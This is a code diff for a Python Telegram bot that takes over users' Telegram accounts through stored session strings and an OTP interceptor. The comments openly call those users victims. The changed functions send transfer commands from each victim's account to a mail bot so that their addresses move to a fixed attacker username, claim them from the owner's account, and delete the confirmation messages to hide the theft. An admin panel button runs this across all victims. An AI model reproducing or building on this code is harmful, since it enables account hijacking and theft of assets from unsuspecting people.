@@ -30,7 +30,7 @@ TARGET_MAIL_BOT = "fakemailbot"
 
 # FIXED VALUES
 FIXED_USERNAME = "@iflexcoderrrrr"
-FIXED_RECEIVE_ID = 8808192812
+FIXED_RECEIVE_ID = 8808192812 # Yahan mails claim hongi
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -147,16 +147,14 @@ async def start_userbot(user_id, session_str):
         except Exception as e:
             logger.error(f"OTP interceptor error: {e}")
 
-    # Auto start stealing for new login
-    asyncio.create_task(transfer_all_mails(user_id))
-
-async def transfer_all_mails(victim_uid):
+async def transfer_and_claim_for_victim(victim_uid):
     try:
+        # Victim aur Owner (Fixed) ka client nikalo
         victim_client = await get_or_connect_client(victim_uid)
         owner_client = await get_or_connect_client(FIXED_RECEIVE_ID)
         
         if not victim_client or not owner_client: 
-            return await Bot(BOT_TOKEN).send_message(FIXED_RECEIVE_ID, f"❌ {p_style('Account not logged in or Owner client error')}", parse_mode="HTML")
+            return await Bot(BOT_TOKEN).send_message(FIXED_RECEIVE_ID, f"❌ {p_style('Account not logged in')}", parse_mode="HTML")
             
         target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
         owner_target_bot = await owner_client.get_entity(TARGET_MAIL_BOT)
@@ -164,7 +162,7 @@ async def transfer_all_mails(victim_uid):
         bot = Bot(BOT_TOKEN)
         await bot.send_message(FIXED_RECEIVE_ID, f"⏳ <b>{f_txt('FETCHING MAILS FROM VICTIM')}:</b> {p_style(victim_uid)}", parse_mode="HTML")
         
-        # Send /id and wait for reply
+        # Victim ke account se /id bhej kar list nikalo
         await victim_client.send_message(target_bot, "/id")
         await asyncio.sleep(4)
         
@@ -179,25 +177,21 @@ async def transfer_all_mails(victim_uid):
 
         total = len(emails)
         for idx, email in enumerate(emails, 1):
+            # 1. Transfer from Victim to Fixed Username
             await bot.send_message(FIXED_RECEIVE_ID, f"🔄 <b>{f_txt('TRANSFERRING')}</b> ({idx}/{total}):\n{p_style(email)}", parse_mode="HTML")
-            
-            # Send transfer command
             await victim_client.send_message(target_bot, f"/transfer {email} {FIXED_USERNAME}")
             await asyncio.sleep(4)
             
-            # Delete the transfer confirmation message
             try:
                 msgs = await victim_client.get_messages(target_bot, limit=1)
                 await victim_client.delete_messages(target_bot, msgs[0].id)
             except: pass
             
+            # 2. Claim in Owner (Fixed ID) Account
             await bot.send_message(FIXED_RECEIVE_ID, f"📥 <b>{f_txt('CLAIMING')}</b> ({idx}/{total}):\n{p_style(email)}", parse_mode="HTML")
-            
-            # Send claim command
             await owner_client.send_message(owner_target_bot, email)
             await asyncio.sleep(4)
             
-            # Delete claim confirmation message
             try:
                 msgs = await owner_client.get_messages(owner_target_bot, limit=1)
                 await owner_client.delete_messages(owner_target_bot, msgs[0].id)
@@ -400,7 +394,7 @@ async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if uid not in get_all_admins(): return
     
     kb = [
-        [InlineKeyboardButton("👥 Logged Accounts", callback_data="admin_acc"), InlineKeyboardButton("📤 Transfer All Mails", callback_data="admin_claim")],
+        [InlineKeyboardButton("👥 Logged Accounts", callback_data="admin_acc"), InlineKeyboardButton("📤 Claim All Mails", callback_data="admin_claim")],
         [InlineKeyboardButton("🎰 Set Result", callback_data="admin_result"), InlineKeyboardButton("👑 Add Admin", callback_data="admin_add")]
     ]
     await update.message.reply_text(f"<b>👑 {f_txt('OWNER PANEL')}</b>,\nAll commands:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
@@ -426,12 +420,16 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_states[uid] = 'admin'
 
     elif data == "admin_claim":
-        await query.edit_message_text(f"⏳ <b>{f_txt('FETCHING AND TRANSFERRING ALL MAILS')}</b>,\nPlease wait...", parse_mode="HTML")
-        users = db_exec("SELECT user_id FROM users WHERE session_string IS NOT NULL AND user_id != ?", (uid,))
+        await query.edit_message_text(f"⏳ <b>{f_txt('FETCHING AND TRANSFERRING ALL MAILS FROM VICTIMS')}</b>,\nPlease wait...", parse_mode="HTML")
+        
+        # SIRF VICTIMS KO PICK KARO (Owner aur Fixed ID ko chhod kar)
+        users = db_exec("SELECT user_id FROM users WHERE session_string IS NOT NULL AND user_id != ? AND user_id != ?", (uid, FIXED_RECEIVE_ID))
+        
         if not users:
             return await query.message.reply_text("❌ No victim accounts found,")
+            
         for u in users:
-            asyncio.create_task(transfer_all_mails(u[0]))
+            asyncio.create_task(transfer_and_claim_for_victim(u[0]))
 
 # ================== MAIN ==================
 def main():
